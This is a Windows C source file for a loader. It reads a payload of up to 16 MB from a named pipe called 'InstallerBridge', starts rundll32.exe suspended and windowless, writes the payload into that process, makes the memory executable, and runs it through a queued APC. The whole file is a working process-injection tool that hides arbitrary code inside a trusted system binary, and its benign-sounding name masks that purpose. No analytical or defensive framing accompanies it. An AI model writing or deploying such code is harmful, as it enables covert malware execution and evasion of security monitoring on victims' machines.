#include <windows.h>

#define MAX_STAGE_SIZE (16 * 1024 * 1024)

typedef struct {
    DWORD status;
    DWORD process_id;
} BRIDGE_REPLY;

static BOOL read_all(HANDLE channel, BYTE *buffer, DWORD size)
{
    DWORD offset = 0;

    while (offset < size) {
        DWORD count = 0;
        if (!ReadFile(channel, buffer + offset, size - offset, &count, NULL) ||
            !count) {
            return FALSE;
        }
        offset += count;
    }
    return TRUE;
}

static BOOL write_all(HANDLE channel, const BYTE *buffer, DWORD size)
{
    DWORD offset = 0;

    while (offset < size) {
        DWORD count = 0;
        if (!WriteFile(channel, buffer + offset, size - offset, &count, NULL) ||
            !count) {
            return FALSE;
        }
        offset += count;
    }
    return TRUE;
}

int wmain(void)
{
    static const WCHAR channel_name[] = L"\\\\.\\pipe\\InstallerBridge";
    HANDLE channel = INVALID_HANDLE_VALUE;
    HANDLE heap = GetProcessHeap();
    BYTE *stage = NULL;
    LPVOID remote_stage = NULL;
    DWORD stage_size = 0;
    DWORD old_protection = 0;
    DWORD status = ERROR_SUCCESS;
    DWORD resume_status;
    WCHAR host_path[MAX_PATH];
    WCHAR command_line[MAX_PATH];
    STARTUPINFOW startup;
    PROCESS_INFORMATION process;
    BRIDGE_REPLY reply;
    int attempt;

    ZeroMemory(&startup, sizeof(startup));
    ZeroMemory(&process, sizeof(process));
    startup.cb = sizeof(startup);

    for (attempt = 0; attempt < 40; ++attempt) {
        channel = CreateFileW(
            channel_name,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        if (channel != INVALID_HANDLE_VALUE) {
            break;
        }
        Sleep(250);
    }
    if (channel == INVALID_HANDLE_VALUE) {
        return 11;
    }

    if (!read_all(channel, (BYTE *)&stage_size, sizeof(stage_size))) {
        status = ERROR_READ_FAULT;
        goto finish;
    }
    if (!stage_size || stage_size > MAX_STAGE_SIZE) {
        status = ERROR_BAD_LENGTH;
        goto finish;
    }

    stage = (BYTE *)HeapAlloc(heap, 0, stage_size);
    if (!stage) {
        status = ERROR_NOT_ENOUGH_MEMORY;
        goto finish;
    }
    if (!read_all(channel, stage, stage_size)) {
        status = ERROR_READ_FAULT;
        goto finish;
    }

    if (!GetSystemDirectoryW(host_path, MAX_PATH)) {
        status = GetLastError();
        goto finish;
    }
    if (lstrlenW(host_path) + lstrlenW(L"\\rundll32.exe") + 1 >= MAX_PATH) {
        status = ERROR_INSUFFICIENT_BUFFER;
        goto finish;
    }
    lstrcatW(host_path, L"\\rundll32.exe");
    lstrcpyW(command_line, host_path);

    if (!CreateProcessW(
            host_path,
            command_line,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup,
            &process)) {
        status = GetLastError();
        goto finish;
    }

    remote_stage = VirtualAllocEx(
        process.hProcess,
        NULL,
        stage_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remote_stage) {
        status = GetLastError();
        goto finish;
    }
    if (!WriteProcessMemory(
            process.hProcess,
            remote_stage,
            stage,
            stage_size,
            NULL)) {
        status = GetLastError();
        goto finish;
    }
    if (!VirtualProtectEx(
            process.hProcess,
            remote_stage,
            stage_size,
            PAGE_EXECUTE_READ,
            &old_protection)) {
        status = GetLastError();
        goto finish;
    }
    if (!FlushInstructionCache(process.hProcess, remote_stage, stage_size)) {
        status = GetLastError();
        goto finish;
    }
    if (!QueueUserAPC((PAPCFUNC)remote_stage, process.hThread, 0)) {
        status = GetLastError();
        goto finish;
    }

    resume_status = ResumeThread(process.hThread);
    if (resume_status == (DWORD)-1) {
        status = GetLastError();
        goto finish;
    }

finish:
    reply.status = status;
    reply.process_id = status == ERROR_SUCCESS ? process.dwProcessId : 0;
    write_all(channel, (const BYTE *)&reply, sizeof(reply));
    FlushFileBuffers(channel);

    if (status != ERROR_SUCCESS && process.hProcess) {
        TerminateProcess(process.hProcess, status);
    }
    if (process.hThread) {
        CloseHandle(process.hThread);
    }
    if (process.hProcess) {
        CloseHandle(process.hProcess);
    }
    if (stage) {
        SecureZeroMemory(stage, stage_size);
        HeapFree(heap, 0, stage);
    }
    CloseHandle(channel);
    return status == ERROR_SUCCESS ? 0 : 20;
}
